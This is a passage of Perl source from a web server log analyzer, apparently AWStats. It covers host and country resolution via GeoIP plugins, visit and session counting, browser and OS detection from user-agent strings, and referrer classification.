s/^::ffff://;\n\t\t\t\t\t$HostResolved = '*';\n\t\t\t\t\t$ip           = 4;\n\t\t\t\t}\n\t\t\t\telsif ( $Host =~ /$regipv4/o ) {\n\t\t\t\t\t$HostResolved = '*';\n\t\t\t\t\t$ip           = 4;\n\t\t\t\t}    # IPv4\n\t\t\t\telsif ( $Host =~ /$regipv6/o ) {\n\t\t\t\t\t$HostResolved = '*';\n\t\t\t\t\t$ip           = 6;\n\t\t\t\t}    # IPv6\n\t\t\t\tif ($Debug) { debug( \"  No DNS lookup asked.\", 4 ); }\n\t\t\t}\n\n\t\t\t# Analyze: Country (Top-level domain)\n\t\t\t#------------------------------------\n\t\t\tif ($Debug) {\n\t\t\t\tdebug(\n\"  Search country (Host=$Host HostResolved=$HostResolved ip=$ip)\",\n\t\t\t\t\t4\n\t\t\t\t);\n\t\t\t}\n\t\t\tmy $Domain = 'ip';\n\n\t\t\t# Set $HostResolved to host and resolve domain\n\t\t\tif ( $HostResolved eq '*' ) {\n\n# $Host is an IP address and is not resolved (failed or not asked) or resolution gives an IP address\n\t\t\t\t$HostResolved = $Host;\n\n\t\t\t\t# Resolve Domain\n\t\t\t\tif ( $PluginsLoaded{'GetCountryCodeByAddr'}{'geoip6'} ) {\n\t\t\t\t\t$Domain = GetCountryCodeByAddr_geoip6($HostResolved);\n\t\t\t\t}\n\t\t\t\telsif ( $PluginsLoaded{'GetCountryCodeByAddr'}{'geoip'} ) {\n\t\t\t\t\t$Domain = GetCountryCodeByAddr_geoip($HostResolved);\n\t\t\t\t}\n\n#\t\t\telsif ($PluginsLoaded{'GetCountryCodeByAddr'}{'geoip_region_maxmind'}) { $Domain=GetCountryCodeByAddr_geoip_region_maxmind($HostResolved); }\n#\t\t\telsif ($PluginsLoaded{'GetCountryCodeByAddr'}{'geoip_city_maxmind'})   { $Domain=GetCountryCodeByAddr_geoip_city_maxmind($HostResolved); }\n\t\t\t\telsif ( $PluginsLoaded{'GetCountryCodeByAddr'}{'geoipfree'} ) {\n\t\t\t\t\t$Domain = GetCountryCodeByAddr_geoipfree($HostResolved);\n\t\t\t\t}\n\t\t\t\tif ($AtLeastOneSectionPlugin) {\n\t\t\t\t\tforeach my $pluginname (\n\t\t\t\t\t\tkeys %{ $PluginsLoaded{'SectionProcessIp'} } )\n\t\t\t\t\t{\n\t\t\t\t\t\tmy $function = \"SectionProcessIp_$pluginname\";\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug( \"  Call to plugin function $function\", 5 );\n\t\t\t\t\t\t}\n\t\t\t\t\t\t&$function($HostResolved);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\telse {\n\n# $Host was already a host name ($ip=0, $Host=name, $HostResolved='') or has been resolved ($ip>0, $Host=ip, $HostResolved defined)\n\t\t\t\t$HostResolved = lc( $HostResolved ? $HostResolved : $Host );\n\n\t\t\t\t# Resolve Domain\n\t\t\t\tif ($ip)\n\t\t\t\t{    # If we have ip, we use it in priority instead of hostname\n\t\t\t\t\tif ( $PluginsLoaded{'GetCountryCodeByAddr'}{'geoip6'} ) {\n\t\t\t\t\t\t$Domain = GetCountryCodeByAddr_geoip6($Host);\n\t\t\t\t\t}\n\t\t\t\t\telsif ( $PluginsLoaded{'GetCountryCodeByAddr'}{'geoip'} ) {\n\t\t\t\t\t\t$Domain = GetCountryCodeByAddr_geoip($Host);\n\t\t\t\t\t}\n\n#\t\t\t\telsif ($PluginsLoaded{'GetCountryCodeByAddr'}{'geoip_region_maxmind'}) { $Domain=GetCountryCodeByAddr_geoip_region_maxmind($Host); }\n#\t\t\t\telsif ($PluginsLoaded{'GetCountryCodeByAddr'}{'geoip_city_maxmind'})   { $Domain=GetCountryCodeByAddr_geoip_city_maxmind($Host); }\n\t\t\t\t\telsif (\n\t\t\t\t\t\t$PluginsLoaded{'GetCountryCodeByAddr'}{'geoipfree'} )\n\t\t\t\t\t{\n\t\t\t\t\t\t$Domain = GetCountryCodeByAddr_geoipfree($Host);\n\t\t\t\t\t}\n\t\t\t\t\telsif ( $HostResolved =~ /\\.(\\w+)$/ ) { $Domain = $1; }\n\t\t\t\t\tif ($AtLeastOneSectionPlugin) {\n\t\t\t\t\t\tforeach my $pluginname (\n\t\t\t\t\t\t\tkeys %{ $PluginsLoaded{'SectionProcessIp'} } )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tmy $function = \"SectionProcessIp_$pluginname\";\n\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\tdebug( \"  Call to plugin function $function\",\n\t\t\t\t\t\t\t\t\t5 );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t&$function($Host);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tif ( $PluginsLoaded{'GetCountryCodeByName'}{'geoip6'} ) {\n\t\t\t\t\t\t$Domain = GetCountryCodeByName_geoip6($HostResolved);\n\t\t\t\t\t}\n\t\t\t\t\telsif ( $PluginsLoaded{'GetCountryCodeByName'}{'geoip'} ) {\n\t\t\t\t\t\t$Domain = GetCountryCodeByName_geoip($HostResolved);\n\t\t\t\t\t}\n\n#\t\t\t\telsif ($PluginsLoaded{'GetCountryCodeByName'}{'geoip_region_maxmind'}) { $Domain=GetCountryCodeByName_geoip_region_maxmind($HostResolved); }\n#\t\t\t\telsif ($PluginsLoaded{'GetCountryCodeByName'}{'geoip_city_maxmind'})   { $Domain=GetCountryCodeByName_geoip_city_maxmind($HostResolved); }\n\t\t\t\t\telsif (\n\t\t\t\t\t\t$PluginsLoaded{'GetCountryCodeByName'}{'geoipfree'} )\n\t\t\t\t\t{\n\t\t\t\t\t\t$Domain = GetCountryCodeByName_geoipfree($HostResolved);\n\t\t\t\t\t}\n\t\t\t\t\telsif ( $HostResolved =~ /\\.(\\w+)$/ ) { $Domain = $1; }\n\t\t\t\t\tif ($AtLeastOneSectionPlugin) {\n\t\t\t\t\t\tforeach my $pluginname (\n\t\t\t\t\t\t\tkeys %{ $PluginsLoaded{'SectionProcessHostname'} } )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tmy $function = \"SectionProcessHostname_$pluginname\";\n\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\tdebug( \"  Call to plugin function $function\",\n\t\t\t\t\t\t\t\t\t5 );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t&$function($HostResolved);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t# Store country\n\t\t\tif ($PageBool) { $_domener_p{$Domain}++; }\n\t\t\tif ($countedtraffic != 6){$_domener_h{$Domain}++;}\n\t\t\tif ( $field[$pos_size] ne '-' && $pos_size>0) {\n\t\t\t\t$_domener_k{$Domain} += int( $field[$pos_size] );\n\t\t\t}\n\n\t\t\t# Analyze: Host, URL entry+exit and Session\n\t\t\t#------------------------------------------\n\t\t\tif ($PageBool) {\n\t\t\t\tmy $timehostl = $_host_l{$HostResolved};\n\t\t\t\tif ($timehostl) {\n\n# A visit for this host was already detected\n# TODO everywhere there is $VISITTIMEOUT\n#\t\t\t\t$timehostl =~ /^\\d\\d\\d\\d\\d\\d(\\d\\d)/; my $daytimehostl=$1;\n#\t\t\t\tif ($timerecord > ($timehostl+$VISITTIMEOUT+($dateparts[3]>$daytimehostl?$NEWDAYVISITTIMEOUT:0))) {\n\t\t\t\t\tif ( $timerecord > ( $timehostl + $VISITTIMEOUT ) ) {\n\n\t\t\t\t\t\t# This is a second visit or more\n\t\t\t\t\t\tif ( !$_waithost_s{$HostResolved} ) {\n\n\t\t\t\t\t\t\t# This is a second visit or more\n\t\t\t\t\t\t\t# We count 'visit','exit','entry','DayVisits'\n\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\tdebug(\n\"  This is a second visit for $HostResolved.\",\n\t\t\t\t\t\t\t\t\t4\n\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tmy $timehosts = $_host_s{$HostResolved};\n\t\t\t\t\t\t\tmy $page      = $_host_u{$HostResolved};\n\t\t\t\t\t\t\tif ($page) { $_url_x{$page}++; }\n\t\t\t\t\t\t\t$_url_e{ $field[$pos_url] }++;\n\t\t\t\t\t\t\t$DayVisits{$yearmonthdayrecord}++;\n\n\t\t\t\t # We can't count session yet because we don't have the start so\n\t\t\t\t # we save params of first 'wait' session\n\t\t\t\t\t\t\t$_waithost_l{$HostResolved} = $timehostl;\n\t\t\t\t\t\t\t$_waithost_s{$HostResolved} = $timehosts;\n\t\t\t\t\t\t\t$_waithost_u{$HostResolved} = $page;\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse {\n\n\t\t\t\t\t\t # This is third visit or more\n\t\t\t\t\t\t # We count 'session','visit','exit','entry','DayVisits'\n\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\tdebug(\n\"  This is a third visit or more for $HostResolved.\",\n\t\t\t\t\t\t\t\t\t4\n\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tmy $timehosts = $_host_s{$HostResolved};\n\t\t\t\t\t\t\tmy $page      = $_host_u{$HostResolved};\n\t\t\t\t\t\t\tif ($page) { $_url_x{$page}++; }\n\t\t\t\t\t\t\t$_url_e{ $field[$pos_url] }++;\n\t\t\t\t\t\t\t$DayVisits{$yearmonthdayrecord}++;\n\t\t\t\t\t\t\tif ($timehosts) {\n\t\t\t\t\t\t\t\t$_session{ GetSessionRange( $timehosts,\n\t\t\t\t\t\t\t\t\t\t$timehostl ) }++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Save new session properties\n\t\t\t\t\t\t$_host_s{$HostResolved} = $timerecord;\n\t\t\t\t\t\t$_host_l{$HostResolved} = $timerecord;\n\t\t\t\t\t\t$_host_u{$HostResolved} = $field[$pos_url];\n\t\t\t\t\t}\n\t\t\t\t\telsif ( $timerecord > $timehostl ) {\n\n\t\t\t\t\t\t# This is a same visit we can count\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug(\n\"  This is same visit still running for $HostResolved. host_l/host_u changed to $timerecord/$field[$pos_url]\",\n\t\t\t\t\t\t\t\t4\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t$_host_l{$HostResolved} = $timerecord;\n\t\t\t\t\t\t$_host_u{$HostResolved} = $field[$pos_url];\n\t\t\t\t\t}\n\t\t\t\t\telsif ( $timerecord == $timehostl ) {\n\n\t\t\t\t\t\t# This is a same visit we can count\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug(\n\"  This is same visit still running for $HostResolved. host_l/host_u changed to $timerecord/$field[$pos_url]\",\n\t\t\t\t\t\t\t\t4\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t$_host_u{$HostResolved} = $field[$pos_url];\n\t\t\t\t\t}\n\t\t\t\t\telsif ( $timerecord < $_host_s{$HostResolved} ) {\n\n\t\t\t\t\t   # Should happens only with not correctly sorted log files\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug(\n\"  This is same visit still running for $HostResolved with start not in order. host_s changed to $timerecord (entry page also changed if first visit)\",\n\t\t\t\t\t\t\t\t4\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif ( !$_waithost_s{$HostResolved} ) {\n\n# We can reorder entry page only if it's the first visit found in this update run (The saved entry page was $_waithost_e if $_waithost_s{$HostResolved} is not defined. If second visit or more, entry was directly counted and not saved)\n\t\t\t\t\t\t\t$_waithost_e{$HostResolved} = $field[$pos_url];\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse {\n\n# We can't change entry counted as we dont't know what was the url counted as entry\n\t\t\t\t\t\t}\n\t\t\t\t\t\t$_host_s{$HostResolved} = $timerecord;\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug(\n\"  This is same visit still running for $HostResolved with hit between start and last hits. No change\",\n\t\t\t\t\t\t\t\t4\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse {\n\n# This is a new visit (may be). First new visit found for this host. We save in wait array the entry page to count later\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  New session (may be) for $HostResolved. Save in wait array to see later\",\n\t\t\t\t\t\t\t4\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\t$_waithost_e{$HostResolved} = $field[$pos_url];\n\n\t\t\t\t\t# Save new session properties\n\t\t\t\t\t$_host_u{$HostResolved} = $field[$pos_url];\n\t\t\t\t\t$_host_s{$HostResolved} = $timerecord;\n\t\t\t\t\t$_host_l{$HostResolved} = $timerecord;\n\t\t\t\t}\n\t\t\t\t$_host_p{$HostResolved}++;\n\t\t\t}\n\t\t\t$_host_h{$HostResolved}++;\n\t\t\tif ( $field[$pos_size] ne '-' && $pos_size>0) {\n\t\t\t\t$_host_k{$HostResolved} += int( $field[$pos_size] );\n\t\t\t}\n\n\t\t\t# Analyze: Browser - OS\n\t\t\t#----------------------\n\t\t\tif ( $pos_agent >= 0 ) {\n\n\t\t\t\tif ($LevelForBrowsersDetection) {\n\n\t\t\t\t\t# Analyze: Browser\n\t\t\t\t\t#-----------------\n\t\t\t\t\tmy $uabrowser = $TmpBrowser{$UserAgent};\n\t\t\t\t\tif ( !$uabrowser ) {\n\t\t\t\t\t\tmy $found = 1;\n\n\t\t\t\t\t\t# Edge (must be at beginning)\n\t\t\t\t\t\tif ($UserAgent =~ /$regveredge/o)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t$_browser_h{\"edge$1\"}++;\n\t\t\t\t\t\t\tif ($PageBool) { $_browser_p{\"edge$1\"}++; }\n\t\t\t\t\t\t\t$TmpBrowser{$UserAgent} = \"edge$1\";\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\n\t\t\t\t\t\t# Opera ?\n\t\t\t\t\t\telsif ( $UserAgent =~ /$regveropera/o ) {\t# !!!! version number in in regex $1 or $2 !!!\n\t\t\t\t\t\t    $_browser_h{\"opera\".($1||$2)}++;\n\t\t\t\t\t\t    if ($PageBool) { $_browser_p{\"opera\".($1||$2)}++; }\n\t\t\t\t\t\t    $TmpBrowser{$UserAgent} = \"opera\".($1||$2);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\n\t\t\t\t\t\t# Firefox ?\n\t\t\t\t\t\telsif ( $UserAgent =~ /$regverfirefox/o\n\t\t\t\t\t\t    && $UserAgent !~ /$regnotfirefox/o )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t    $_browser_h{\"firefox$1\"}++;\n\t\t\t\t\t\t    if ($PageBool) { $_browser_p{\"firefox$1\"}++; }\n\t\t\t\t\t\t    $TmpBrowser{$UserAgent} = \"firefox$1\";\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Chrome ?\n\t\t\t\t\t\telsif ( $UserAgent =~ /$regverchrome/o ) {\n\t\t\t\t\t\t\t$_browser_h{\"chrome$1\"}++;\n\t\t\t\t\t\t\tif ($PageBool) { $_browser_p{\"chrome$1\"}++; }\n\t\t\t\t\t\t\t$TmpBrowser{$UserAgent} = \"chrome$1\";\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Safari ?\n\t\t\t\t\t\telsif ($UserAgent =~ /$regversafari/o\n\t\t\t\t\t\t\t&& $UserAgent !~ /$regnotsafari/o )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tmy $safariver = $BrowsersSafariBuildToVersionHash{$1};\n\t\t\t\t\t\t\tif ( $UserAgent =~ /$regversafariver/o ) {\n\t\t\t\t\t\t\t\t$safariver = $1;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t$_browser_h{\"safari$safariver\"}++;\n\t\t\t\t\t\t\tif ($PageBool) { $_browser_p{\"safari$safariver\"}++; }\n\t\t\t\t\t\t\t$TmpBrowser{$UserAgent} = \"safari$safariver\";\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Konqueror ?\n\t\t\t\t\t\telsif ( $UserAgent =~ /$regverkonqueror/o ) {\n\t\t\t\t\t\t\t$_browser_h{\"konqueror$1\"}++;\n\t\t\t\t\t\t\tif ($PageBool) { $_browser_p{\"konqueror$1\"}++; }\n\t\t\t\t\t\t\t$TmpBrowser{$UserAgent} = \"konqueror$1\";\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Subversion ?\n\t\t\t\t\t\telsif ( $UserAgent =~ /$regversvn/o ) {\n\t\t\t\t\t\t\t$_browser_h{\"svn$1\"}++;\n\t\t\t\t\t\t\tif ($PageBool) { $_browser_p{\"svn$1\"}++; }\n\t\t\t\t\t\t\t$TmpBrowser{$UserAgent} = \"svn$1\";\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# IE < 11 ? (must be at end of test)\n\t\t\t\t\t\telsif ($UserAgent =~ /$regvermsie/o\n\t\t\t\t\t\t\t&& $UserAgent !~ /$regnotie/o )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t$_browser_h{\"msie$2\"}++;\n\t\t\t\t\t\t\tif ($PageBool) { $_browser_p{\"msie$2\"}++; }\n\t\t\t\t\t\t\t$TmpBrowser{$UserAgent} = \"msie$2\";\n\t\t\t\t\t\t}\n\t\t\t\t\t\t\n\t\t\t\t\t\t# IE >= 11\n                        elsif ($UserAgent =~ /$regvermsie11/o && $UserAgent !~ /$regnotie/o)\n\t\t\t\t\t\t{\n                            $_browser_h{\"msie$2\"}++;\n                            if ($PageBool) { $_browser_p{\"msie$2\"}++; }\n                            $TmpBrowser{$UserAgent} = \"msie$2\";\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Netscape 6.x, 7.x ... ? (must be at end of test)\n\t\t\t\t\t\telsif ( $UserAgent =~ /$regvernetscape/o ) {\n\t\t\t\t\t\t\t$_browser_h{\"netscape$1\"}++;\n\t\t\t\t\t\t\tif ($PageBool) { $_browser_p{\"netscape$1\"}++; }\n\t\t\t\t\t\t\t$TmpBrowser{$UserAgent} = \"netscape$1\";\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Netscape 3.x, 4.x ... ? (must be at end of test)\n\t\t\t\t\t\telsif ($UserAgent =~ /$regvermozilla/o\n\t\t\t\t\t\t\t&& $UserAgent !~ /$regnotnetscape/o )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t$_browser_h{\"netscape$2\"}++;\n\t\t\t\t\t\t\tif ($PageBool) { $_browser_p{\"netscape$2\"}++; }\n\t\t\t\t\t\t\t$TmpBrowser{$UserAgent} = \"netscape$2\";\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Other known browsers ?\n\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t$found = 0;\n\t\t\t\t\t\t\tforeach (@BrowsersSearchIDOrder)\n\t\t\t\t\t\t\t{    # Search ID in order of BrowsersSearchIDOrder\n\t\t\t\t\t\t\t\tif ( $UserAgent =~ /$_/ ) {\n\t\t\t\t\t\t\t\t\tmy $browser = &UnCompileRegex($_);\n\n\t\t\t\t\t\t\t\t   # TODO If browser is in a family, use version\n\t\t\t\t\t\t\t\t\t$_browser_h{\"$browser\"}++;\n\t\t\t\t\t\t\t\t\tif ($PageBool) { $_browser_p{\"$browser\"}++; }\n\t\t\t\t\t\t\t\t\t$TmpBrowser{$UserAgent} = \"$browser\";\n\t\t\t\t\t\t\t\t\t$found = 1;\n\t\t\t\t\t\t\t\t\tlast;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Unknown browser ?\n\t\t\t\t\t\tif ( !$found ) {\n\t\t\t\t\t\t\t$_browser_h{'Unknown'}++;\n\t\t\t\t\t\t\tif ($PageBool) { $_browser_p{'Unknown'}++; }\n\t\t\t\t\t\t\t$TmpBrowser{$UserAgent} = 'Unknown';\n\t\t\t\t\t\t\tmy $newua = $UserAgent;\n\t\t\t\t\t\t\t$newua =~ tr/\\+ /__/;\n\t\t\t\t\t\t\t$_unknownrefererbrowser_l{$newua} = $timerecord;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\t$_browser_h{$uabrowser}++;\n\t\t\t\t\t\tif ($PageBool) { $_browser_p{$uabrowser}++; }\n\t\t\t\t\t\tif ( $uabrowser eq 'Unknown' ) {\n\t\t\t\t\t\t\tmy $newua = $UserAgent;\n\t\t\t\t\t\t\t$newua =~ tr/\\+ /__/;\n\t\t\t\t\t\t\t$_unknownrefererbrowser_l{$newua} = $timerecord;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\n\t\t\t\t}\n\n\t\t\t\tif ($LevelForOSDetection) {\n\n\t\t\t\t\t# Analyze: OS\n\t\t\t\t\t#------------\n\t\t\t\t\tmy $uaos = $TmpOS{$UserAgent};\n\t\t\t\t\tif ( !$uaos ) {\n\t\t\t\t\t\tmy $found = 0;\n\n\t\t\t\t\t\t# in OSHashID list ?\n\t\t\t\t\t\tforeach (@OSSearchIDOrder)\n\t\t\t\t\t\t{    # Search ID in order of OSSearchIDOrder\n\t\t\t\t\t\t\tif ( $UserAgent =~ /$_/ ) {\n\t\t\t\t\t\t\t\tmy $osid = $OSHashID{ &UnCompileRegex($_) };\n\t\t\t\t\t\t\t\t$_os_h{\"$osid\"}++;\n\t\t\t\t\t\t\t\tif ($PageBool) { $_os_p{\"$osid\"}++; }\n\t\t\t\t\t\t\t\t$TmpOS{$UserAgent} = \"$osid\";\n\t\t\t\t\t\t\t\t$found = 1;\n\t\t\t\t\t\t\t\tlast;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Unknown OS ?\n\t\t\t\t\t\tif ( !$found ) {\n\t\t\t\t\t\t\t$_os_h{'Unknown'}++;\n\t\t\t\t\t\t\tif ($PageBool) { $_os_p{'Unknown'}++; }\n\t\t\t\t\t\t\t$TmpOS{$UserAgent} = 'Unknown';\n\t\t\t\t\t\t\tmy $newua = $UserAgent;\n\t\t\t\t\t\t\t$newua =~ tr/\\+ /__/;\n\t\t\t\t\t\t\t$_unknownreferer_l{$newua} = $timerecord;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\t$_os_h{$uaos}++;\n\t\t\t\t\t\tif ($PageBool) {\n\t\t\t\t\t\t\t$_os_p{$uaos}++;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif ( $uaos eq 'Unknown' ) {\n\t\t\t\t\t\t\tmy $newua = $UserAgent;\n\t\t\t\t\t\t\t$newua =~ tr/\\+ /__/;\n\t\t\t\t\t\t\t$_unknownreferer_l{$newua} = $timerecord;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\n\t\t\t\t}\n\n\t\t\t}\n\t\t\telse {\n\t\t\t\t$_browser_h{'Unknown'}++;\n\t\t\t\t$_os_h{'Unknown'}++;\n\t\t\t\tif ($PageBool) {\n\t\t\t\t\t$_browser_p{'Unknown'}++;\n\t\t\t\t\t$_os_p{'Unknown'}++;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t# Analyze: Referer\n\t\t\t#-----------------\n\t\t\tmy $found = 0;\n\t\t\tif (   $pos_referer >= 0\n\t\t\t\t&& $LevelForRefererAnalyze\n\t\t\t\t&& $field[$pos_referer] )\n\t\t\t{\n\n\t\t\t\t# Direct ?\n\t\t\t\tif (   $field[$pos_referer] eq '-'\n\t\t\t\t\t|| $field[$pos_referer] eq 'bookmarks' )\n\t\t\t\t{  # \"bookmarks\" is sent by Netscape, '-' by all others browsers\n\t\t\t\t\t    # Direct access\n\t\t\t\t\tif ($PageBool) {\n\t\t\t\t\t\tif ($ShowDirectOrigin) {\n\t\t\t\t\t\t\tprint \"Direct access for line $line\\n\";\n\t\t\t\t\t\t}\n\t\t\t\t\t\t$_from_p[0]++;\n\t\t\t\t\t}\n\t\t\t\t\t$_from_h[0]++;\n\t\t\t\t\t$found = 1;\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\t$field[$pos_referer] =~ /$regreferer/o;\n\t\t\t\t\tmy $refererprot   = $1;\n\t\t\t\t\tmy $refererserver =\n\t\t\t\t\t    ( $2 || '' )\n\t\t\t\t\t  . ( !$3 || $3 eq ':80' ? '' : $3 )\n\t\t\t\t\t  ; # refererserver is www.xxx.com or www.xxx.com:81 but not www.xxx.com:80\n\t\t\t\t\t    # HTML link ?\n\t\t\t\t\tif ( $refererprot =~ /^http/i ) {\n\n#if ($Debug) { debug(\"  Analyze referer refererprot=$refererprot refererserver=$refererserver\",5); }\n\n\t\t\t\t\t\t# Kind of origin\n\t\t\t\t\t\tif ( !$TmpRefererServer{$refererserver} )\n\t\t\t\t\t\t{ # TmpRefererServer{$refererserver} is \"=\" if same site, \"search egine key\" if search engine, not defined otherwise\n\t\t\t\t\t\t\tif ( $refererserver =~ /$reglocal/o ) {\n\n\t\t\t\t\t\t  # Intern (This hit came from another page of the site)\n\t\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\t\tdebug(\n\"  Server '$refererserver' is added to TmpRefererServer with value '='\",\n\t\t\t\t\t\t\t\t\t\t2\n\t\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t$TmpRefererServer{$refererserver} = '=';\n\t\t\t\t\t\t\t\t$found = 1;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tforeach (@HostAliases) {\n\t\t\t\t\t\t\t\t\tif ( $refererserver =~ /$_/ ) {\n\n\t\t\t\t\t\t  # Intern (This hit came from another page of the site)\n\t\t\t\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\t\t\t\tdebug(\n\"  Server '$refererserver' is added to TmpRefererServer with value '='\",\n\t\t\t\t\t\t\t\t\t\t\t\t2\n\t\t\t\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t$TmpRefererServer{$refererserver} = '=';\n\t\t\t\t\t\t\t\t\t\t$found = 1;\n\t\t\t\t\t\t\t\t\t\tlast;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( !$found ) {\n\n\t\t\t\t\t\t\t # Extern (This hit came from an external web site).\n\n\t\t\t\t\t\t\t\t\tif ($LevelForSearchEnginesDetection) {\n\n\t\t\t\t\t\t\t\t\t\tforeach (@SearchEnginesSearchIDOrder)\n\t\t\t\t\t\t\t\t\t\t{ # Search ID in order of SearchEnginesSearchIDOrder\n\t\t\t\t\t\t\t\t\t\t\tif ( $refererserver =~ /$_/ ) {\n\t\t\t\t\t\t\t\t\t\t\t\tmy $key = &UnCompileRegex($_);\n\t\t\t\t\t\t\t\t\t\t\t\tif (\n\t\t\t\t\t\t\t\t\t\t\t\t\t!$NotSearchEnginesKeys{$key}\n\t\t\t\t\t\t\t\t\t\t\t\t\t|| $refererserver !~\n/$NotSearchEnginesKeys{$key}/i\n\t\t\t\t\t\t\t\t\t\t\t\t  )\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\n\t\t\t\t\t\t\t\t\t # This hit came from the search engine $key\n\t\t\t\t\t\t\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tdebug(\n\"  Server '$refererserver' is added to TmpRefererServer with value '$key'\",\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t2\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\t$TmpRefererServer{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$refererserver} =\n\t\t\t\t\t\t\t\t\t\t\t\t\t  $SearchEnginesHashID{ $key\n\t\t\t\t\t\t\t\t\t\t\t\t\t  };\n\t\t\t\t\t\t\t\t\t\t\t\t\t$found = 1;\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\tlast;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\tmy $tmprefererserver =\n\t\t\t\t\t\t  $TmpRefererServer{$refererserver};\n\t\t\t\t\t\tif ($tmprefererserver) {\n\t\t\t\t\t\t\tif ( $tmprefererserver eq '=' ) {\n\n\t\t\t\t\t\t  # Intern (This hit came from another page of the site)\n\t\t\t\t\t\t\t\tif ($PageBool) { $_from_p[4]++; }\n\t\t\t\t\t\t\t\t$_from_h[4]++;\n\t\t\t\t\t\t\t\t$found = 1;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\n\t\t\t\t\t\t\t\t# This hit came from a search engine\n\t\t\t\t\t\t\t\tif ($PageBool) {\n\t\t\t\t\t\t\t\t\t$_from_p[2]++;\n\t\t\t\t\t\t\t\t\t$_se_referrals_p{$tmprefererserver}++;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t$_from_h[2]++;\n\t\t\t\t\t\t\t\t$_se_referrals_h{$tmprefererserver}++;\n\t\t\t\t\t\t\t\t$found = 1;\n\t\t\t\t\t\t\t\tif ( $PageBool && 